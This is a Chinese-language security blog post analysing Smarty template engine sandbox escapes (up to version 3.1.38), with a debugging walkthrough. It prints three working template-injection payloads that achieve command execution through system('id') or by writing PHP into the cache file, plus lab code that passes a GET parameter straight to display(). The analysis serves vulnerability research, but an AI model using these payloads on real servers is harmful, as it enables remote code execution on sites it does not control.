# SmartyPHP沙箱逃逸分析

阅读量 **239757**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-04-13 16:30:21

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t01e795371960f03978.jpg)

## 介绍

Smarty是一个使用PHP写出来的模板引擎，是目前业界最著名的PHP模板引擎之一。它分离了逻辑代码和外在的内容，提供了一种易于管理和使用的方法，用来将原本与HTML代码混杂在一起PHP代码逻辑分离。简单的讲，目的就是要使PHP程序员同前端人员分离，使程序员改变程序的逻辑内容不会影响到前端人员的页面设计，前端人员重新修改页面不会影响到程序的程序逻辑，这在多人合作的项目中显的尤为重要。

## 沙箱

沙盒是一种安全机制，为运行中的程序提供的隔离环境。通常是作为一些来源不可信、具破坏力或无法判定程序意图的程序提供实验之用。  
沙盒通常严格控制其中的程序所能访问的资源，比如，沙盒可以提供用后即回收的磁盘及内存空间。在沙盒中，网络访问、对真实系统的访问、对输入设备的读取通常被禁止或是严格限制。从这个角度来说，沙盒属于虚拟化的一种。  
沙盒中的所有改动对操作系统不会造成任何损失。通常，这种技术被计算机技术人员广泛用于测试可能带毒的程序或是其他的恶意代码

在smarty php中  
sandbox默认为

    
    
    <?php
    include_once('../libs/Smarty.class.php');
    $smarty = new Smarty();
    $smarty->enableSecurity();
    $smarty->display($_GET['poc']);
    

更严格的沙箱机制为

    
    
    <?php
    include_once('../libs/Smarty.class.php');
    $smarty = new Smarty();
    $my_security_policy = new Smarty_Security($smarty);
    $my_security_policy->php_functions = null;
    $my_security_policy->php_handling = Smarty::PHP_REMOVE;
    $my_security_policy->php_modifiers = null;
    $my_security_policy->static_classes = null;
    $my_security_policy->allow_super_globals = false;
    $my_security_policy->allow_constants = false;
    $my_security_policy->allow_php_tag = false;
    $my_security_policy->streams = null;
    $my_security_policy->php_modifiers = null;
    $smarty->enableSecurity($my_security_policy);
    $smarty->display($_GET['poc']);
    

## payload

版本: Smarty Template Engine <= 3.1.38

    
    
    ?poc=string:{$s=$smarty.template_object->smarty}{$fp=$smarty.template_object->compiled->filepath}{Smarty_Internal_Runtime_WriteFile::writeFile($fp,"<?php+phpinfo();",$s)}
    
    
    
    ?poc=string:{$smarty.template_object->smarty->disableSecurity()->display('string:{system(\'id\')}')}
    
    
    
    ?poc=string:{function+name='rce(){};system("id");function+'}{/function}
    

## 漏洞分析

###  静态分析

在process函数中我们可以发现首先判断了  
是否存在缓存文件  
如果不存在缓存文件就新建一个文件，如果存在缓存文件就include它  
所以payload执行两次就可以进行命令执行  
在此我们就在此进行了代码的插入

![](https://p0.ssl.qhimg.com/t01ee739441bb207e6d.png)

我们看一下

![](https://p1.ssl.qhimg.com/t01fa62fa6ceb121baf.png)

就可以将我们的payload写入缓存文件当中  
payload1 进行的就是再将缓存文件写入自己插入的代码  
payload2 进行的是先将smarty的enableSecurity()再指向了disableSecurity（）再进行命令执行  
payload3
进行的是Smarty_Internal_Runtime_TplFunction在tplFunctions的定义时没有正确的过滤所以导致的命令执行

payload 2、3可以绕过更严格的沙箱机制进行沙箱逃逸

###  动态调试

首先我们在display处下断点  
可以发现它进入了Smarty_Internal_TemplateBase的_execute

![](https://p0.ssl.qhimg.com/t0139677508b6318f3b.png)

我们可以看到  
首先执行_getSmartyObj();  
也就是新建了一个Smarty的对象  
之后进入if判断跳转到了这里

![](https://p0.ssl.qhimg.com/t0126cd05581baccd56.png)

我们可以看见是要新建一个template的对象  
执行之后可以发现已经将我们的payload储存到了template_resource当中

![](https://p5.ssl.qhimg.com/t01b38c41edc86ff3a2.png)

再下面就是操作数据、合并数据等操作了  
我们直接进入render函数当中

![](https://p4.ssl.qhimg.com/t018857c7fd007f2f3f.png)

在这里我们可以发现由于缓存文件不存在因此我们要新建一个缓存文件

![](https://p1.ssl.qhimg.com/t015c09adc5794a37e4.png)

这就是我们新建的cache的初始状态  
我们可以发现，我们就调用了writeFile将<?php phpinfo;写入

![](https://p4.ssl.qhimg.com/t01cecc0c4071cff4f5.png)

执行后我们就能发现缓存文件变为了我们插入的代码  
再次运行一次  
由于我们已经有了这个缓存文件  
所以就直接include这个文件了

![](https://p0.ssl.qhimg.com/t017debf6f04d75359e.png)

同理

执行命令执行时  
缓存文件变成了

![](https://p4.ssl.qhimg.com/t01b36bcb5b2261f7e0.png)

![](https://p5.ssl.qhimg.com/t0106790c62171ecf4a.png)

![](https://p2.ssl.qhimg.com/t01d8ff57f47d68465f.png)

都可以执行命令执行之后include后获得回显

## 参考文章

<https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Bubb1EGVM** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/235505](/post/id/235505)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [PHP](/tag/PHP)
  * [Smarty](/tag/Smarty)

 **+1** __6赞

 __收藏

![](https://p2.ssl.qhimg.com/t0106565d580deb2ef1.png) Bubb1EGVM

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

